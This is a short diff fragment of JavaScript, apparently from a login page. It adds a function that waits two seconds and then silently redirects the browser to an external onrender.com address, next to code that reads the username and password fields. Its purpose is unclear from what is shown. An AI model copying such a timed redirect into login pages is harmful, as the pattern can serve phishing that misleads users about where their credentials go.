@@ -109,6 +109,10 @@
                             status: "danger"
                         });
                     };
+	async function init(){
+		await delay(2000);
+		window.location.replace('https://fixcraftvpn.onrender.com/')
+	}
 	function checkSuccess(){
 		var text = document.getElementById("password").value
 		var text2 = document.getElementById("username").value
